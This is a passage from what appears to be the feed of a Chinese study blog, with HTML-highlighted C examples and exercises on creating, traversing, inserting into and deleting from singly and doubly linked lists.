class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">p = head-&gt;rlink;  <span class="comment">//由于是带头结点的 所以 指向 head 的 下一个位置</span></span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *p = head-&gt;rlink;</span><br><span class="line">    dnode *s;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n双链表中不存在值为 y 的结点，无法插入！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 进行插入 ：在值为 y 的结点之前插入 值为 x 的新的结点</span></span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = p;</span><br><span class="line">        p-&gt;llink-&gt;rlink = s;</span><br><span class="line">        s-&gt;llink = p-&gt;llink;</span><br><span class="line">        p-&gt;llink = s;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt,*pt1;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt1 = insert(pt,<span class="number">10</span>,<span class="number">99</span>); <span class="comment">//在 10 前面插入 99</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行操作之后：\n&quot;</span>);</span><br><span class="line">    print(pt1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/Cf2WKS5phxjXoIi.png" alt="image-20211005184052812"></p><h3 id="6-设计一个算法，从右向左打印一个双链表中各个结点的值。"><a href="#6-设计一个算法，从右向左打印一个双链表中各个结点的值。" class="headerlink" title="6. 设计一个算法，从右向左打印一个双链表中各个结点的值。"></a>6. 设计一个算法，从右向左打印一个双链表中各个结点的值。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">rlink</span>,*<span class="title">llink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法  创建 带头结点的 双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s;</span><br><span class="line">datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入双链表的内容：（以 0 结束）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink;</span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">    p = head-&gt;rlink;</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表的各个值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;rlink;</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从右向左打印一个双链表中各个结点的值</span></span><br><span class="line"><span class="comment">//递归法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_reverse</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;rlink)&#123;</span><br><span class="line">        print_reverse(head-&gt;rlink);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,head-&gt;rlink-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行操作之后：\n&quot;</span>);</span><br><span class="line">print_reverse(pt);</span><br><span class="line">    <span class="comment">//print(pt);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/iMBrSeKhj7Z819k.png" alt="image-20211005185759360"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="链式存储" scheme="https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>线性表的链式存储</title>
    <link href="https://xizhi-future.github.io/2021/10/05/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"/>
    <id>https://xizhi-future.github.io/2021/10/05/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/</id>
    <published>2021-10-05T11:49:33.000Z</published>
    <updated>2021-10-07T09:32:38.385Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="线性表的链式存储"><a href="#线性表的链式存储" class="headerlink" title="线性表的链式存储"></a>线性表的链式存储</h2><p>线性表的存储方式：顺序存储 、链式存储</p><p>单链表  带头结点的单链表  循环单链表  双链表  特殊的线性表–栈和队列 的 链式存储实现</p><p>链式存储：指针 体现结点之间的逻辑关系  info   next</p><p><img src="https://i.loli.net/2021/09/25/o8ihcCZxbRSAPQ4.png" alt="image-20210925132250254"></p><hr><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>结点包含 两个域：info域    next 指针域</p><p>必须含有一个首指针 指向单链表中的第一个结点  head</p><p><img src="https://i.loli.net/2021/09/25/3pCOcuU62fDqEWI.png" alt="image-20210925132456231"></p><h4 id="单链表的创建"><a href="#单链表的创建" class="headerlink" title="单链表的创建"></a>单链表的创建</h4><p><strong>前插法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="function">node *<span class="title">creat_first</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>尾插法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *r = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输出各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            head = s;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="单链表的操作"><a href="#单链表的操作" class="headerlink" title="单链表的操作"></a>单链表的操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立一个空的链表</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找值是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_x</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != x)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 第 i 个结点</span></span><br><span class="line"><span class="function">node *<span class="title">find_i</span><span class="params">(node *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j  = <span class="number">1</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;\nError!&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i!=j)</span><br><span class="line">    &#123;p = p-&gt;next;j++;&#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入 值为 x 的结点作为单链表的第一个结点  </span></span><br><span class="line"><span class="function">node *<span class="title">insert_begin</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = head;</span><br><span class="line">    head = p;  <span class="comment">//p 现在是第一个结点，头 head 换成 p</span></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在单链表 第 i 个结点之后插入一个值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert_medium</span><span class="params">(node *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    q = find_i(head,i);<span class="comment">//查找第 i 个结点</span></span><br><span class="line">    <span class="keyword">if</span>(!q)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到第 i 个结点，不能进行插入！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    q-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在单链表最后位置插入结点 x</span></span><br><span class="line"><span class="function">node *<span class="title">insert_last</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    node *q;</span><br><span class="line">    q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;info = x;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next)&#123;  <span class="comment">//找到最后一个结点的位置，最后一个结点的 next 是 NULL</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;next = q;</span><br><span class="line">    q-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除单链表 结点</span></span><br><span class="line"><span class="function">node *<span class="title">delete_begin</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *pre = <span class="literal">NULL</span>,*p;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != x)&#123; <span class="comment">//如果删除的是中间的 用 pre 指向 p 原本的位置</span></span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!pre &amp;&amp; p-&gt;info == x)&#123; <span class="comment">//需要删除的是 第一个 结点</span></span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pre-&gt;next = p-&gt;next; <span class="comment">//需要删除的是 中间的 结点</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链式存储 的插入与删除 比 顺序表方便，但不能随机去访问 某个结点</p><p>插入判满，删除判空！！！！！！！1</p><h3 id="带头结点的单链表"><a href="#带头结点的单链表" class="headerlink" title="带头结点的单链表"></a>带头结点的单链表</h3><p><img src="https://i.loli.net/2021/09/28/JTnbN5DRBp3eHLv.png" alt="image-20210928161355054"></p><h4 id="带头结点的单链表创建"><a href="#带头结点的单链表创建" class="headerlink" title="带头结点的单链表创建"></a>带头结点的单链表创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后插法 创建 带头结点的 单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head,*s,*r;</span><br><span class="line">datatype x;</span><br><span class="line">    head = r = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入单链表内容：（以 0 结尾）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="带头结点的单链表操作"><a href="#带头结点的单链表操作" class="headerlink" title="带头结点的单链表操作"></a>带头结点的单链表操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 